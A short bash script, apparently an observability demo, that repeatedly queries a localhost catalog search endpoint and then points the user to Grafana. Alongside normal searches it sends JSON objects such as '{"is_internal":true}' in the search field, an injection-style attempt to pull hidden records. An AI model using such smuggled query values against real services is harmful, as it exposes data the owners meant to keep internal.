#!/usr/bin/env bash
set -euo pipefail

BASE_URL="${BASE_URL:-http://localhost:8080}"

echo "Attaching to the host..."
echo ""

END=$((SECONDS + 60))
TOTAL_ROUNDS=30
ROUND=0

while [ $SECONDS -lt $END ]; do
  ROUND=$((ROUND + 1))

  curl -s -o /dev/null -G "${BASE_URL}/catalog/products" --data-urlencode "search=widget"
  curl -s -o /dev/null -G "${BASE_URL}/catalog/products" --data-urlencode 'search={}'
  curl -s -o /dev/null -G "${BASE_URL}/catalog/products" --data-urlencode 'search={"is_internal":true}'

  printf "\r\033[K  Round %2d/%d probing... (%ds elapsed)" "${ROUND}" "${TOTAL_ROUNDS}" "${SECONDS}"
  sleep 2
done

echo ""
echo ""
echo "Extraction complete. Open Grafana to see what happened."
